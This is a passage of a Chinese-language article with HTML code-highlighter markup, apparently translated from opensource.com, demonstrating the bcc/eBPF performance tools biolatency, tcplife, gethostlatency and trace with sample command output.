class=\"crayon-v\">h</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">interval</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-4\"><span class=\"crayon-e\">Summarize </span><span class=\"crayon-e\">block </span><span class=\"crayon-i\">device</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">O</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">latency </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-6\"><span class=\"crayon-e\">positional </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">interval            </span><span class=\"crayon-e\">output </span><span class=\"crayon-v\">interval</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">seconds</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-8\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">count               </span><span class=\"crayon-e\">number </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">outputs</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-10\"><span class=\"crayon-e\">optional </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">help          </span><span class=\"crayon-e\">show </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">help </span><span class=\"crayon-e\">message </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">T</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">timestamp     </span><span class=\"crayon-e\">include </span><span class=\"crayon-e\">timestamp </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">output</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">queued        </span><span class=\"crayon-e\">include </span><span class=\"crayon-e\">OS </span><span class=\"crayon-e\">queued </span><span class=\"crayon-e\">time </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">O</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-14\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">milliseconds  </span><span class=\"crayon-e\">millisecond </span><span class=\"crayon-v\">histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">disks         </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">histogram </span><span class=\"crayon-e\">per </span><span class=\"crayon-e\">disk </span><span class=\"crayon-e\">device</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-17\"><span class=\"crayon-v\">examples</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># summarize block I/O latency as a histogram</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\">       </span><span class=\"crayon-p\"># print 1 second summaries, 10 times</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">mT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-p\"># 1s summaries, milliseconds, and timestamps</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Q</span><span class=\"crayon-h\">         </span><span class=\"crayon-p\"># include OS queued time in I/O time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ae617232921-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">biolatency</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-h\">         </span><span class=\"crayon-p\"># show each disk device separately</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ae617232921-23\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0039 seconds] -->\r\n<p>它们的行为就像其它 Unix 工具一样，以利于采用而设计。</p>\n<h4 id=\"toc_6\">5、 tcplife</h4>\n<p>另一个有用的工具是 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/tcplife.py\">tcplife</a> ，该例显示 TCP 会话的生命周期和吞吐量统计。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000b2991550821\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/tcplife\r\nPID   COMM       LADDR           LPORT RADDR           RPORT TX_KB RX_KB MS\r\n12759 sshd       192.168.56.101  22    192.168.56.1    60639     2     3 1863.82\r\n12783 sshd       192.168.56.101  22    192.168.56.1    60640     3     3 9174.53\r\n12844 wget       10.0.2.15       34250 54.204.39.132   443      11  1870 5712.26\r\n12851 curl       10.0.2.15       34252 54.204.39.132   443       0    74 505.90\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b2991550821-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b2991550821-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b2991550821-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b2991550821-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b2991550821-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b2991550821-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b2991550821-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000b2991550821-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/tcplife</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b2991550821-2\"><span class=\"crayon-e\">PID   </span><span class=\"crayon-e\">COMM       </span><span class=\"crayon-e\">LADDR           </span><span class=\"crayon-e\">LPORT </span><span class=\"crayon-e\">RADDR           </span><span class=\"crayon-e\">RPORT </span><span class=\"crayon-e\">TX_KB </span><span class=\"crayon-e\">RX_KB </span><span class=\"crayon-i\">MS</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b2991550821-3\"><span class=\"crayon-cn\">12759</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">192.168.56.101</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">192.168.56.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">60639</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1863.82</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b2991550821-4\"><span class=\"crayon-cn\">12783</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">192.168.56.101</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">192.168.56.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">60640</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9174.53</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b2991550821-5\"><span class=\"crayon-cn\">12844</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">wget</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">10.0.2.15</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">34250</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">54.204.39.132</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1870</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5712.26</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b2991550821-6\"><span class=\"crayon-cn\">12851</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">10.0.2.15</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">34252</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">54.204.39.132</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">74</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">505.90</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b2991550821-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>在你说 “我不是可以只通过 <code>tcpdump(8)</code> 就能输出这个？” 之前请注意，运行 <code>tcpdump(8)</code> 或任何数据包嗅探器，在高数据包速率的系统上的开销会很大，即使 <code>tcpdump(8)</code> 的用户层和内核层机制已经过多年优化（要不可能更差）。<code>tcplife</code> 不会测试每个数据包；它只会有效地监视 TCP 会话状态的变化，并由此得到该会话的持续时间。它还使用已经跟踪了吞吐量的内核计数器，以及进程和命令信息（“PID” 和 “COMM” 列），这些对于 <code>tcpdump(8)</code> 等线上嗅探工具是做不到的。</p>\n<h4 id=\"toc_7\">6、 gethostlatency</h4>\n<p>之前的每个例子都涉及到内核跟踪，所以我至少需要一个用户级跟踪的例子。 这就是 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/gethostlatency.py\">gethostlatency</a>，它检测用于名称解析的 <code>gethostbyname(3)</code> 和相关的库调用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000b6403167617\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/gethostlatency\r\nTIME      PID    COMM                  LATms HOST\r\n06:43:33  12903  curl                 188.98 opensource.com\r\n06:43:36  12905  curl                   8.45 opensource.com\r\n06:43:40  12907  curl                   6.55 opensource.com\r\n06:43:44  12911  curl                   9.67 opensource.com\r\n06:45:02  12948  curl                  19.66 opensource.cats\r\n06:45:06  12950  curl                  18.37 opensource.cats\r\n06:45:07  12952  curl                  13.64 opensource.cats\r\n06:45:19  13139  curl                  13.10 opensource.cats\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b6403167617-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b6403167617-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b6403167617-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b6403167617-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000b6403167617-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000b6403167617-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/gethostlatency</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b6403167617-2\"><span class=\"crayon-e\">TIME      </span><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM                  </span><span class=\"crayon-e\">LATms </span><span class=\"crayon-i\">HOST</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-3\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12903</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">188.98</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b6403167617-4\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12905</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">8.45</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-5\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12907</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">6.55</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b6403167617-6\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">44</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12911</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">9.67</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-7\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">02</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12948</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">19.66</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b6403167617-8\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12950</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">18.37</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-9\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12952</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">13.64</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000b6403167617-10\"><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">13139</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">13.10</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">opensource</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cats</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000b6403167617-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>是的，总是有 DNS 请求，所以有一个工具来监视系统范围内的 DNS 请求会很方便（这只有在应用程序使用标准系统库时才有效）。看看我如何跟踪多个对 “opensource.com” 的查找？ 第一个是 188.98 毫秒，然后更快，不到 10 毫秒，毫无疑问，这是缓存的作用。它还追踪多个对 “opensource.cats” 的查找，一个不存在的可怜主机名，但我们仍然可以检查第一个和后续查找的延迟。（第二次查找后是否有一些否定缓存的影响？）</p>\n<h4 id=\"toc_8\">7、 trace</h4>\n<p>好的，再举一个例子。 <a href=\"https://github.com/iovisor/bcc/blob/master/tools/trace.py\">trace</a> 工具由 Sasha Goldshtein 提供，并提供了一些基本的 <code>printf(1)</code> 功能和自定义探针。 例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000ba861594124\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/trace 'pam:pam_start \"%s: %s\", arg1, arg2'\r\nPID    TID    COMM         FUNC             -\r\n13266  13266  sshd         pam_start        sshd: root\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ba861594124-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ba861594124-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000ba861594124-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000ba861594124-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000ba861594124-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/trace 'pam:pam_start \"%s: %s\", arg1, arg2'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ba861594124-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">TID    </span><span class=\"crayon-e\">COMM         </span><span class=\"crayon-v\">FUNC</span><span class=\"crayon-h\">             </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000ba861594124-3\"><span class=\"crayon-cn\">13266</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">13266</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">sshd         </span><span class=\"crayon-e\">pam_start        </span><span class=\"crayon-v\">sshd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> 